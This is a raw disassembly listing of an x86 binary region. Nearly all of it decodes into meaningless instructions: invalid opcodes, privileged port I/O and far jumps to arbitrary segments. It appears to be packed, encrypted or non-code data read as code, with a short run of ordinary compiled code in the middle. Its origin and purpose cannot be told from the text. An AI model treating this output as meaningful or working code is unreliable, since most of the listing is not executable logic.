  40422a:	sub    esp,DWORD PTR [esi+0x65b57fc7]
  404230:	lds    esi,FWORD PTR [ebx+0x1895a207]
  404236:	mov    ch,0xec
  404238:	les    edi,FWORD PTR [edi+0x2]
  40423b:	es jge 0x4042a5
  40423e:	in     eax,0x71
  404240:	arpl   WORD PTR [esi+0x65d84a7c],di
  404246:	jno    0x404200
  404248:	cld    
  404249:	cmp    ch,BYTE PTR [ebp+eax*4-0x51]
  40424d:	jo     0x404253
  40424f:	push   ecx
  404250:	pop    esi
  404251:	pop    ebx
  404252:	or     DWORD PTR [ecx+0x23357f89],0x18e08a23
  40425c:	mov    BYTE PTR [edi-0x106c4efc],cl
  404262:	mov    edx,0x4d0b0532
  404267:	mov    ebx,0x28e8cf01
  40426c:	loop   0x4042a4
  40426e:	test   eax,0xd01b8032
  404273:	dec    ecx
  404274:	inc    ebp
  404275:	sbb    eax,0x303de174
  40427a:	pop    ebx
  40427b:	pop    ss
  40427c:	shl    ecx,0xbc
  40427f:	sbb    al,ch
  404281:	sbb    BYTE PTR [edi],ch
  404283:	test   eax,0x5a5e18b7
  404288:	aas    
  404289:	ficomp WORD PTR [esi]
  40428b:	add    ah,BYTE PTR [edi]
  40428d:	dec    edx
  40428e:	inc    ecx
  40428f:	sub    BYTE PTR [edx],bh
  404291:	cmp    eax,0xe4616104
  404296:	test   al,0x2c
  404298:	jle    0x4042df
  40429a:	stos   BYTE PTR es:[edi],al
  40429b:	(bad)  
  40429d:	stc    
  40429e:	cli    
  40429f:	lds    edx,FWORD PTR [ebp-0xbd8156c]
  4042a5:	cmp    BYTE PTR [esi],bh
  4042a7:	in     eax,0x30
  4042a9:	ins    BYTE PTR es:[edi],dx
  4042aa:	xchg   edi,eax
  4042ab:	jns    0x404256
  4042ad:	popf   
  4042ae:	jp     0x404242
  4042b0:	iret   
  4042b1:	icebp  
  4042b2:	jnp    0x4042fd
  4042b4:	in     eax,dx
  4042b5:	lahf   
  4042b6:	popa   
  4042b7:	arpl   WORD PTR [ecx],sp
  4042b9:	ror    DWORD PTR [ebp+0xc79dabb],cl
  4042bf:	je     0x4042ae
  4042c1:	pusha  
  4042c2:	adc    bh,BYTE PTR [eax+0x4c1b0f84]
  4042c8:	or     eax,0x44e5bcd3
  4042cd:	sub    BYTE PTR fs:[ebx],al
  4042d0:	xor    BYTE PTR [eax-0x428b8c83],bl
  4042d6:	stc    
  4042d7:	and    ebp,DWORD PTR [ebp+0x457d3911]
  4042dd:	add    bh,BYTE PTR [edi+0x4a]
  4042e0:	stc    
  4042e1:	pop    ecx
  4042e2:	jbe    0x40429a
  4042e4:	xlat   BYTE PTR ds:[ebx]
  4042e5:	adc    DWORD PTR [edx+eax*1],0x9ef3aeee
  4042ec:	repz adc DWORD PTR [ebx-0x8],esp
  4042f0:	int3   
  4042f1:	adc    eax,0x83bfdb6a
  4042f6:	sub    al,0x38
  4042f8:	jnp    0x40432b
  4042fa:	sub    DWORD PTR [esp],eax
  4042fd:	add    DWORD PTR [edi],0x52
  404300:	mov    dl,0x9b
  404302:	xlat   BYTE PTR ds:[ebx]
  404303:	sub    esp,DWORD PTR [ebx+ebx*1]
  404306:	xor    ebp,DWORD PTR [edi-0x2b]
  404309:	int3   
  40430a:	push   esp
  40430b:	aad    0x36
  40430d:	jmp    0x5b05:0x93aa6bd4
  404314:	adc    ch,BYTE PTR [esi+ecx*1]
  404317:	xor    DWORD PTR [esi+edi*1+0x6a],ecx
  40431b:	mov    cl,BYTE PTR ds:[eax]
  40431e:	mov    edx,0x4b0432b5
  404323:	pop    esi
  404324:	aaa    
  404325:	jge    0x4042d7
  404327:	cld    
  404328:	mov    BYTE PTR [edi],al
  40432a:	dec    esp
  40432b:	clc    
  40432c:	jb     0x4042b2
  40432e:	jecxz  0x4042d2
  404330:	mov    bl,0xca
  404332:	mov    DWORD PTR [edx],edi
  404334:	mov    bl,0xd0
  404336:	or     BYTE PTR [ecx-0x2],ch
  404339:	cmp    DWORD PTR [esi-0x172cf41c],ebp
  40433f:	and    eax,0xfd4aab80
  404344:	in     al,dx
  404345:	sub    ecx,DWORD PTR [ebp-0x608aa5e4]
  40434b:	xchg   ebx,eax
  40434c:	fstp   DWORD PTR [edx-0x3b6ec6bd]
  404352:	jo     0x404351
  404354:	mov    edx,0xf05bd690
  404359:	sub    eax,0xde0bbc78
  40435e:	add    al,0x49
  404360:	push   ecx
  404361:	or     al,0x5b
  404363:	movd   DWORD PTR [eax-0x15],mm4
  404367:	pushf  
  404368:	test   cl,dh
  40436a:	mov    eax,0x4fb0c3fb
  40436f:	int3   
  404370:	dec    esp
  404371:	out    0xa6,al
  404373:	(bad)  
  404374:	lock xchg edi,eax
  404376:	cmp    ecx,ebp
  404378:	mov    DWORD PTR [ebx+0x65],eax
  40437b:	cmp    ah,BYTE PTR [edi-0x43]
  40437e:	pop    ss
  40437f:	xchg   esi,eax
  404380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404381:	or     dl,BYTE PTR [edx-0x6ed4a599]
  404387:	mov    edi,0x66febab2
  40438c:	inc    ebp
  40438d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40438e:	pop    ds
  40438f:	inc    edi
  404390:	xor    DWORD PTR [edx],edx
  404392:	cmp    al,0x56
  404394:	push   eax
  404395:	call   0x3f97e280
  40439a:	sbb    eax,0x10002942
  40439f:	fsubr  DWORD PTR [eax-0x5c514ebb]
  4043a5:	mov    ecx,0x61f0a944
  4043aa:	lock mov edx,?
  4043ad:	test   DWORD PTR [ebx],0x7c36cbd0
  4043b3:	cmp    ch,BYTE PTR [esi+ecx*2-0xb]
  4043b7:	mov    al,ds:0xcf8f81fb
  4043bc:	or     DWORD PTR [esp+edi*1+0x32],0xf1f529f9
  4043c4:	adc    DWORD PTR [esi-0x74037b76],0xffffffde
  4043cb:	pop    esi
  4043cc:	fisubr WORD PTR [edx+0x1bd0df79]
  4043d2:	or     cl,ch
  4043d4:	loopne 0x404362
  4043d6:	adc    DWORD PTR [esi],esi
  4043d8:	inc    eax
  4043d9:	sahf   
  4043da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043db:	xchg   edi,eax
  4043dc:	enter  0x4e5a,0x72
  4043e0:	in     eax,0x11
  4043e2:	push   edx
  4043e3:	das    
  4043e4:	stos   DWORD PTR es:[edi],eax
  4043e5:	add    esp,DWORD PTR [edi-0x72]
  4043e8:	arpl   ax,bx
  4043ea:	sti    
  4043eb:	loopne 0x4043da
  4043ed:	scas   al,BYTE PTR es:[edi]
  4043ee:	add    al,0x73
  4043f0:	dec    edx
  4043f1:	inc    ebx
  4043f2:	push   eax
  4043f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043f5:	mov    edx,0xa4e4bdbe
  4043fa:	mov    dh,0xac
  4043fc:	in     eax,dx
  4043fd:	sbb    dh,0xc1
  404400:	aad    0xae
  404402:	jge    0x4043f5
  404404:	arpl   cx,sp
  404406:	sbb    al,0xe2
  404408:	sti    
  404409:	xchg   esp,eax
  40440a:	xor    edi,esp
  40440c:	shr    BYTE PTR [ecx+eiz*2-0x5b],cl
  404410:	xchg   ebp,eax
  404411:	push   eax
  404412:	aad    0x18
  404414:	ins    DWORD PTR es:[edi],dx
  404415:	mov    cl,0xd7
  404417:	fdiv   QWORD PTR [edi+0x4a3e1c0b]
  40441d:	fdivr  DWORD PTR [edx-0x33]
  404420:	or     al,0xdb
  404422:	xor    dl,BYTE PTR [edi+0x16]
  404425:	data16 jo 0x40449c
  404428:	inc    ebp
  404429:	ret    
  40442a:	mov    esi,0x5b8254cd
  40442f:	mov    ah,0xc4
  404431:	es push 0x4b
  404434:	not    BYTE PTR [edi]
  404436:	jmp    0xeadd5fc8
  40443b:	shr    DWORD PTR [ebx+0x5b],cl
  40443e:	outs   dx,DWORD PTR ds:[esi]
  40443f:	mov    al,0xb7
  404441:	mov    BYTE PTR [edi+eax*8-0x29],cl
  404445:	inc    ebx
  404446:	sbb    bl,BYTE PTR [ebp-0x4b]
  404449:	lock ja 0x4043d0
  40444c:	jmp    0x4044a7
  40444e:	retf   
  40444f:	lods   eax,DWORD PTR ds:[esi]
  404450:	mov    ebp,DWORD PTR cs:[edx+ecx*1-0x2700a41f]
  404458:	xor    al,0x47
  40445a:	loopne 0x4044cc
  40445c:	jnp    0x4044b5
  40445e:	ja     0x40448d
  404460:	adc    ch,bh
  404462:	cmp    dh,bh
  404464:	popf   
  404465:	dec    edi
  404466:	mov    ds:0x1bc3177,al
  40446b:	dec    ebx
  40446c:	call   0xdbc0:0xb73e7011
  404473:	add    al,0x1c
  404475:	sbb    bl,BYTE PTR [eax+0x55]
  404478:	(bad)
  40447b:	xor    al,0x33
  40447d:	clc    
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x4044d2
  404490:	cld    
  404491:	stos   BYTE PTR es:[edi],al
  404492:	and    bl,BYTE PTR [esi+0x18]
  404495:	jle    0x404515
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x40448a
  40449c:	mov    edx,0xacd12285
  4044a1:	mov    ecx,0x3176a7b4
  4044a6:	sub    dh,BYTE PTR [ecx+edx*4+0x12]
  4044aa:	je     0x4044a9
  4044ac:	xchg   ebx,eax
  4044ad:	xor    eax,0x13b3d595
  4044b2:	sahf   
  4044b3:	bound  ebp,QWORD PTR [ecx-0x33334b2b]
  4044b9:	lahf   
  4044ba:	into   
  4044bb:	in     al,0xb8
  4044bd:	les    ecx,FWORD PTR [edi+0x1a0e0fa4]
  4044c3:	dec    esp
  4044c4:	cdq    
  4044c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044c6:	int3   
  4044c7:	inc    esp
  4044c8:	pop    eax
  4044c9:	pop    es
  4044ca:	bound  eax,QWORD PTR [eax-0x53]
  4044cd:	xor    BYTE PTR [ebx+0x66],0x2d
  4044d1:	cmp    bl,BYTE PTR [ebp-0x15]
  4044d4:	and    dh,0xe3
  4044d7:	call   0x7586:0x3dd15b7d
  4044de:	push   es
  4044df:	(bad)  
  4044e0:	stos   DWORD PTR es:[edi],eax
  4044e1:	cmp    bl,cl
  4044e3:	sbb    BYTE PTR fs:[edx-0x38],ah
  4044e7:	pop    ecx
  4044e8:	hlt    
  4044e9:	mov    al,0xca
  4044eb:	and    DWORD PTR [ebx-0x28],edi
  4044ee:	add    esi,DWORD PTR [eax]
  4044f0:	xchg   edx,eax
  4044f1:	sti    
  4044f2:	test   eax,0x78d54b56
  4044f7:	xchg   ebp,eax
  4044f8:	cld    
  4044f9:	cmp    ch,BYTE PTR [ebx+0x4e]
  4044fc:	add    ah,bh
  4044fe:	jp     0x4044aa
  404500:	(bad)  [edx-0x1e4fea3b]
  404506:	jmp    0xee436fc0
  40450b:	sbb    dh,0x4d
  40450e:	pop    eax
  40450f:	lea    edi,[edx]
  404511:	add    DWORD PTR [ebp+esi*1+0x11b9ae13],edi
  404518:	ins    DWORD PTR es:[edi],dx
  404519:	mov    ah,0xdf
  40451b:	int    0x25
  40451d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40451e:	fadd   DWORD PTR [eax+0x46cd1b1f]
  404524:	mov    esp,0x6db23448
  404529:	test   eax,0x11482bac
  40452e:	fmul   QWORD PTR [ebp+0x20]
  404531:	mov    dl,al
  404533:	loope  0x404527
  404535:	enter  0x6e32,0x8e
  404539:	adc    bh,BYTE PTR [esp+edi*1-0x59]
  40453d:	mov    ch,0xed
  40453f:	and    DWORD PTR [ebp+0x38774941],edx
  404545:	mov    bh,0x99
  404547:	push   ebx
  404548:	mov    bl,0xa1
  40454a:	push   0xffffffe7
  40454c:	xchg   edx,eax
  40454d:	rcl    BYTE PTR [ebp+0x1ee99502],cl
  404553:	jmp    0x40450e
  404555:	or     dl,0x92
  404558:	mov    ch,0x94
  40455a:	stos   DWORD PTR es:[edi],eax
  40455b:	mov    edx,0x54c5695
  404560:	push   cs
  404561:	adc    cl,BYTE PTR [edx]
  404563:	fs stos BYTE PTR es:[edi],al
  404565:	sbb    ebx,ebp
  404567:	fisttp WORD PTR [ebx+0x5]
  40456a:	lods   eax,DWORD PTR ds:[esi]
  40456b:	jno    0x40455e
  40456d:	pop    ebx
  40456e:	mov    cl,0x38
  404570:	test   al,0xe
  404572:	cmp    eax,0x82df81f
  404577:	xor    ebx,DWORD PTR [eax+0x3063f32d]
  40457d:	outs   dx,BYTE PTR ds:[esi]
  40457e:	retf   0xfaa9
  404581:	cmp    cl,BYTE PTR [ebx-0x71]
  404584:	jno    0x404585
  404586:	jae    0x404517
  404588:	add    eax,0x6041bd1d
  40458d:	sbb    esi,DWORD PTR [esi+0x83ce143]
  404593:	lea    edx,[eax+eiz*4-0x7944f135]
  40459a:	outs   dx,BYTE PTR ds:[esi]
  40459b:	lods   al,BYTE PTR ds:[esi]
  40459c:	int3   
  40459d:	fwait
  40459e:	pop    ebx
  40459f:	loopne 0x4045be
  4045a1:	sahf   
  4045a2:	sbb    al,0x3
  4045a4:	or     BYTE PTR [esi],bh
  4045a6:	stos   DWORD PTR es:[edi],eax
  4045a7:	lea    ebx,[ebp+edi*2-0x5557210c]
  4045ae:	cs jmp 0x3cda:0xa4fb93f5
  4045b6:	sub    esi,DWORD PTR ds:[ecx+0x37dfe015]
  4045bd:	daa    
  4045be:	push   es
  4045bf:	lock je 0x4045c4
  4045c2:	and    ebx,DWORD PTR ds:0xca6b1165
  4045c8:	sbb    DWORD PTR [ebx-0xb],0xe9ee1efc
  4045cf:	test   ebx,eax
  4045d1:	call   0xb79f:0x354d8f0
  4045d8:	dec    esi
  4045d9:	(bad)  
  4045da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045db:	cli    
  4045dc:	inc    edx
  4045dd:	xchg   ecx,eax
  4045de:	in     al,0xb8
  4045e0:	imul   esp,esp,0xffffffbc
  4045e3:	clc    
  4045e4:	add    DWORD PTR [esi],0x7f
  4045e7:	arpl   bp,si
  4045e9:	mov    edi,0xd7d792a3
  4045ee:	imul   edi,DWORD PTR [esi],0xd2b2e563
  4045f4:	icebp  
  4045f5:	xchg   esi,eax
  4045f6:	cld    
  4045f7:	sub    BYTE PTR [edi],al
  4045f9:	out    0x46,eax
  4045fb:	inc    ebx
  4045fc:	dec    esp
  4045fd:	sbb    al,0xcd
  4045ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404600:	jmp    0x1dd63b0e
  404605:	add    ebp,eax
  404607:	pop    ss
  404608:	in     al,dx
  404609:	mov    esp,0x91735f3a
  40460e:	cld    
  40460f:	gs ins BYTE PTR es:[edi],dx
  404611:	dec    DWORD PTR [edx]
  404613:	fnstcw WORD PTR [edi]
  404615:	mov    eax,ds:0x631397dc
  40461a:	xor    al,BYTE PTR [ecx]
  40461c:	sar    BYTE PTR [edi+0xc],0xad
  404620:	out    dx,al
  404621:	repnz test eax,0x653e6199
  404627:	sub    DWORD PTR [edi-0x18428f21],esp
  40462d:	cli    
  40462e:	xchg   esp,eax
  40462f:	lds    ecx,FWORD PTR [edx-0x48]
  404632:	dec    esi
  404633:	fnstsw WORD PTR [eax+esi*4]
  404636:	push   ds
  404637:	les    ecx,FWORD PTR [esi-0x5ca5a5a0]
  40463d:	add    BYTE PTR [esi-0x29b72d6b],cl
  404643:	cmp    bl,BYTE PTR [edx-0x321a66b6]
  404649:	icebp  
  40464a:	and    bl,BYTE PTR [edx-0x5621733a]
  404650:	push   ds
  404651:	cmp    al,0x72
  404653:	jbe    0x4045ed
  404655:	or     eax,0xfbcd79d5
  40465a:	retf   
  40465b:	stos   DWORD PTR es:[edi],eax
  40465c:	data16 sti 
  40465e:	or     eax,DWORD PTR [edi+0x6b]
  404661:	jne    0x4046ac
  404663:	daa    
  404664:	gs ja  0x4045fb
  404667:	sub    DWORD PTR [edi+0x13],ecx
  40466a:	cmp    edx,ebx
  40466c:	retf   0x9c06
  40466f:	sub    cl,BYTE PTR [esi+0x7d]
  404672:	rcr    BYTE PTR [esp+edx*4+0x7387d62b],0xdd
  40467a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40467b:	cmp    al,0xfc
  40467d:	out    0xf,al
  40467f:	adc    al,0x79
  404681:	ja     0x40461b
  404683:	mov    eax,0x64219982
  404688:	jnp    0x404702
  40468a:	out    0x34,eax
  40468c:	mov    al,ds:0x92faf65a
  404691:	cmp    al,0x86
  404693:	xchg   DWORD PTR [ebx],edi
  404695:	sub    al,0x73
  404697:	or     al,0x16
  404699:	mov    edx,0x94d5bd3e
  40469e:	(bad)  
  4046a0:	ret    
  4046a1:	arpl   sp,di
  4046a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046a4:	outs   dx,DWORD PTR ds:[esi]
  4046a5:	es add al,0xff
  4046a8:	hlt    
  4046a9:	xor    bl,dh
  4046ab:	add    ah,BYTE PTR [edi-0x7f]
  4046ae:	xlat   BYTE PTR ds:[ebx]
  4046af:	inc    eax
  4046b0:	rol    BYTE PTR [edx-0x80],0xf8
  4046b4:	fmul   QWORD PTR ds:0x3e6e2b34
  4046ba:	sbb    ebp,DWORD PTR [eax]
  4046bc:	push   ebp
  4046bd:	and    BYTE PTR [esi],bl
  4046bf:	jge    0x40470a
  4046c1:	cmc    
  4046c2:	sub    eax,0x5d673ac
  4046c7:	sub    DWORD PTR [edi],edx
  4046c9:	dec    eax
  4046ca:	push   edx
  4046cb:	xchg   ebx,eax
  4046cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046cd:	pop    esi
  4046ce:	jns    0x40466f
  4046d0:	loop   0x4046dc
  4046d2:	pop    esi
  4046d3:	cmc    
  4046d4:	(bad)  
  4046d5:	and    eax,0x33033256
  4046da:	cmp    DWORD PTR [ebx],0x932dc828
  4046e0:	xchg   edi,eax
  4046e1:	icebp  
  4046e2:	inc    edi
  4046e3:	and    al,0x8c
  4046e5:	pop    ebx
  4046e6:	icebp  
  4046e7:	cmc    
  4046e8:	fsub   DWORD PTR [esi]
  4046ea:	push   esi
  4046eb:	and    eax,0x2adfdbb7
  4046f0:	cli    
  4046f1:	(bad)  
  4046f2:	cmp    bh,BYTE PTR [ecx-0x47]
  4046f5:	mov    BYTE PTR [eax+0x508ae464],cl
  4046fb:	clc    
  4046fc:	cld    
  4046fd:	mov    bh,0xd3
  4046ff:	adc    eax,0x4f631d7a
  404704:	cmp    ebx,DWORD PTR [edi-0x463b515e]
  40470a:	leave  
  40470b:	rcl    DWORD PTR [ecx+edx*2-0x48095435],cl
  404712:	jbe    0x404789
  404714:	lods   eax,DWORD PTR ds:[esi]
  404715:	arpl   WORD PTR [edx-0x10],dx
  404718:	push   ds
  404719:	dec    BYTE PTR [ebp+0x3b]
  40471c:	cmp    eax,0x537d0c5d
  404721:	mov    ch,0x59
  404723:	cmp    DWORD PTR [edx-0x3],eax
  404726:	das    
  404727:	cmp    DWORD PTR [edi-0x7],esp
  40472a:	xor    eax,0xa67435bb
  40472f:	push   0x63
  404731:	aam    0xe0
  404733:	les    edx,FWORD PTR [esi-0x2a079fda]
  404739:	dec    ecx
  40473a:	in     al,dx
  40473b:	scas   al,BYTE PTR es:[edi]
  40473c:	xchg   ebx,eax
  40473d:	lock lock out 0xde,eax
  404741:	je     0x404781
  404743:	xor    BYTE PTR [edi-0x3ff327d3],ch
  404749:	or     eax,0xc2d6ea33
  40474e:	push   ebx
  40474f:	adc    BYTE PTR [ecx],bl
  404751:	dec    edi
  404752:	(bad)  
  404753:	xor    dh,BYTE PTR [edx+0x66]
  404756:	pop    ebx
  404757:	jg     0x404744
  404759:	outs   dx,BYTE PTR ds:[esi]
  40475a:	mov    bh,0xee
  40475c:	je     0x404780
  40475e:	out    0x31,eax
  404760:	pop    esi
  404761:	call   0xce6b:0xbab14df4
  404768:	pop    ds
  404769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40476a:	ret    
  40476b:	pop    esi
  40476c:	sub    DWORD PTR [eax],ebx
  40476e:	mov    al,0xe4
  404770:	and    eax,0xdcc3e5c8
  404775:	jb     0x40475a
  404777:	je     0x404743
  404779:	out    dx,al
  40477a:	xor    eax,0xfa160574
  40477f:	push   0x3d03386
  404784:	stc    
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	xor    eax,ebp
  4047b6:	mov    al,ds:0x7e27b8ac
  4047bb:	jle    0x404815
  4047bd:	jl     0x40483d
  4047bf:	jle    0x404806
  4047c1:	addr16 loop 0x40478a
  4047c4:	into   
  4047c5:	mov    WORD PTR [eax],?
  4047c7:	imul   eax,DWORD PTR [esi-0x65],0xcdce234b
  4047ce:	scas   al,BYTE PTR es:[edi]
  4047cf:	mov    edi,DWORD PTR [esi+0x4b2c69f3]
  4047d5:	aaa    
  4047d6:	mov    edi,0x4884207
  4047db:	outs   dx,BYTE PTR ds:[esi]
  4047dc:	add    DWORD PTR [esi-0x624d5d60],0xffffffb0
  4047e3:	sbb    dh,BYTE PTR ds:0xa7a4fcc0
  4047e9:	mov    ebp,0x38beea08
  4047ee:	cs int3 
  4047f0:	fimul  DWORD PTR [esp+ebx*8]
  4047f3:	aaa    
  4047f4:	test   BYTE PTR [edi+0x69],ah
  4047f7:	cmc    
  4047f8:	adc    DWORD PTR [ebx-0x35],0x44
  4047fc:	call   0xce6c:0x31cb2489
  404803:	mov    cl,BYTE PTR ss:[ecx]
  404806:	sub    DWORD PTR [edx+0x48e7e3d8],esp
  40480c:	dec    ebp
  40480d:	mov    edi,0x4b8bce5f
  404812:	loop   0x4047cc
  404814:	test   edi,eax
  404816:	ja     0x4047b3
  404818:	cmp    ch,bh
  40481a:	dec    ebp
  40481b:	xchg   DWORD PTR [eax],edi
  40481d:	push   es
  40481e:	pop    es
  40481f:	mov    DWORD PTR [edi+0x63],ebx
  404822:	xor    eax,0xb06535a3
  404827:	mov    cl,0xb6
  404829:	jmp    0x4047e1
  40482b:	or     BYTE PTR [ebx],dl
  40482d:	sub    al,0x66
  40482f:	in     al,0xd0
  404831:	cmp    al,0x64
  404833:	adc    dh,BYTE PTR [esi]
  404835:	in     eax,0xea
  404837:	retf   0x20b0
  40483a:	ss pop ds
  40483c:	mov    bl,0x7a
  40483e:	xchg   DWORD PTR [esi-0x37],esi
  404841:	pop    edx
  404842:	out    0xfc,al
  404844:	add    ah,dh
  404846:	xchg   edi,eax
  404847:	pop    ecx
  404848:	fadd   st(3),st
  40484a:	test   eax,0x546b962b
  40484f:	add    al,0xd1
  404851:	adc    al,0x75
  404853:	xchg   edi,eax
  404854:	bound  edx,QWORD PTR [ecx]
  404856:	sub    al,BYTE PTR [ebx+0x28948a3]
  40485c:	jmp    0x339b85e0
  404861:	xchg   edi,eax
  404862:	dec    eax
  404863:	mov    fs,WORD PTR [eax+0x1e]
  404866:	mov    esp,0x3f3b9223
  40486b:	dec    ebx
  40486c:	scas   al,BYTE PTR es:[edi]
  40486d:	daa    
  40486e:	lods   eax,DWORD PTR ds:[esi]
  40486f:	ins    BYTE PTR es:[edi],dx
  404870:	push   esi
  404871:	ins    BYTE PTR es:[edi],dx
  404872:	inc    eax
  404873:	or     ebp,DWORD PTR [eax]
  404875:	xor    DWORD PTR [eax],ecx
  404877:	and    BYTE PTR [esi+eiz*2-0x6c],bl
  40487b:	and    DWORD PTR [esi+eax*8-0x19de41f9],edi
  404882:	loop   0x404829
  404884:	aad    0x7a
  404886:	rcl    BYTE PTR es:[edx],0x6c
  40488a:	fidivr WORD PTR [esi+ecx*4-0x9770168]
  404891:	fadd   st(3),st
  404893:	adc    al,0xe3
  404895:	addr16 sti 
  404897:	sbb    BYTE PTR [esi-0x7d89d203],0x0
  40489e:	cmp    dl,al
  4048a0:	adc    al,0xb8
  4048a2:	sahf   
  4048a3:	mov    ss,WORD PTR [ebx]
  4048a5:	pop    eax
  4048a6:	in     eax,dx
  4048a7:	(bad)  
  4048a8:	imul   ebx,eax,0x9c18af09
  4048ae:	inc    eax
  4048af:	(bad)  
  4048b0:	mov    al,0xf2
  4048b2:	xchg   ebp,eax
  4048b3:	push   di
  4048b5:	and    bh,BYTE PTR [ecx+eax*8-0x4f359017]
  4048bc:	fcomp  QWORD PTR [eax-0x34]
  4048bf:	(bad)  
  4048c1:	repnz (bad) 
  4048c4:	daa    
  4048c5:	push   ecx
  4048c6:	mov    ebx,0x5db489e4
  4048cb:	fstp   TBYTE PTR ss:[ebx-0x31]
  4048cf:	pushf  
  4048d0:	arpl   WORD PTR [edx+0x47],dx
  4048d3:	mov    ds:0x1e4da8e4,eax
  4048d8:	push   ebx
  4048d9:	pop    edi
  4048da:	mov    bl,0x53
  4048dc:	or     bh,bl
  4048de:	ret    0x620e
  4048e1:	cld    
  4048e2:	mov    eax,0x34eaded4
  4048e7:	sbb    al,0x6
  4048e9:	push   ss
  4048ea:	fimul  DWORD PTR [eax]
  4048ec:	and    DWORD PTR [edi*1+0xe67b71c],edi
  4048f3:	ins    BYTE PTR es:[edi],dx
  4048f4:	inc    esp
  4048f5:	add    dl,BYTE PTR ds:0x53b3c69f
  4048fb:	push   ss
  4048fc:	ja     0x404945
  4048fe:	popf   
  4048ff:	xchg   esi,eax
  404900:	call   0xa12b:0xa1afb655
  404907:	test   DWORD PTR [ebp+0x4d],edx
  40490a:	test   DWORD PTR [esi-0x54],esi
  40490d:	(bad)  [esi]
  40490f:	mov    ?,edi
  404911:	cmp    DWORD PTR [edi+ebp*1-0x80],ebx
  404915:	ja     0x404917
  404917:	jmp    0x5a4ce214
  40491c:	xchg   DWORD PTR [edi+0x3],edi
  40491f:	out    0xd8,eax
  404921:	sti    
  404922:	daa    
  404923:	js     0x404953
  404925:	(bad)  
  404926:	inc    DWORD PTR [edi-0x42]
  404929:	(bad)
  40492c:	pop    edx
  40492d:	cmp    BYTE PTR [ebx],0xc9
  404930:	sbb    edi,ebx
  404932:	inc    esp
  404933:	push   edi
  404934:	jle    0x4048c4
  404936:	push   edx
  404937:	paddw  mm5,QWORD PTR [edi]
  40493a:	aas    
  40493b:	jg     0x4049b5
  40493d:	add    esp,DWORD PTR [ecx+0x2f55152a]
  404943:	jg     0x404942
  404945:	adc    cl,bh
  404947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404948:	cmp    ch,bh
  40494a:	rcr    BYTE PTR [edx],1
  40494c:	(bad)  
  40494d:	jmp    0x4e40e4ae
  404952:	dec    esi
  404953:	ficom  WORD PTR [esi+ebx*1+0x2e]
  404957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404958:	loop   0x404994
  40495a:	xor    al,0xa1
  40495c:	ins    DWORD PTR es:[edi],dx
  40495d:	in     eax,0xdd
  40495f:	out    0x64,eax
  404961:	stc    
  404962:	clc    
  404963:	mul    DWORD PTR [edi+0x1]
  404966:	loopne 0x404945
  404968:	or     esp,edx
  40496a:	mov    dl,0xcf
  40496c:	or     DWORD PTR [edx-0x52c51280],esi
  404972:	adc    bh,bh
  404974:	lock dec esp
  404976:	ret    0xd9f0
  404979:	or     eax,0x625f5344
  40497e:	fwait
  40497f:	jmp    0xadb3:0xb1c4f8d7
  404986:	repz jno 0x4049f5
  404989:	outs   dx,BYTE PTR ds:[esi]
  40498a:	jae    0x404934
  40498c:	cmp    DWORD PTR [ebx-0x55ba0eba],esp
  404992:	or     DWORD PTR [edi+0x5a],eax
  404995:	add    dl,dl
  404997:	lods   al,BYTE PTR ds:[esi]
  404998:	xor    DWORD PTR [eax],ebp
  40499a:	push   ss
  40499b:	in     al,dx
  40499c:	sbb    al,0xd8
  40499e:	mov    bl,0x40
  4049a0:	rcl    BYTE PTR [esi-0x78],1
  4049a3:	jo     0x40494f
  4049a5:	and    DWORD PTR [ebp-0xe3ff311],ecx
  4049ab:	cmovne ebx,DWORD PTR fs:[edx+0x4a]
  4049b0:	mov    eax,ds:0xf834a604
  4049b5:	xchg   edi,eax
  4049b6:	jmp    0x1521:0xdd21b81d
  4049bd:	push   esp
  4049be:	xchg   esp,eax
  4049bf:	fiadd  WORD PTR [ebx]
  4049c1:	jecxz  0x4049bf
  4049c3:	lds    esi,FWORD PTR [ebp+0x746791da]
  4049c9:	inc    edi
  4049ca:	out    dx,eax
  4049cb:	std    
  4049cc:	adc    dl,BYTE PTR [ebp-0x1765dc31]
  4049d2:	nop
  4049d3:	mov    dh,0xcd
  4049d5:	(bad)  
  4049d6:	cmc    
  4049d7:	ja     0x4049fd
  4049d9:	bound  edx,QWORD PTR [edx-0x45]
  4049dc:	pop    ebp
  4049dd:	sub    al,BYTE PTR [esi]
  4049df:	ret    
  4049e0:	pop    esp
  4049e1:	test   DWORD PTR [ecx-0x5f0dc908],eax
  4049e7:	(bad)  
  4049e8:	ins    DWORD PTR es:[edi],dx
  4049e9:	cmp    esi,DWORD PTR [esi-0x3a6d2633]
  4049ef:	daa    
  4049f0:	pop    eax
  4049f1:	mov    esp,0x155eec21
  4049f6:	inc    ebx
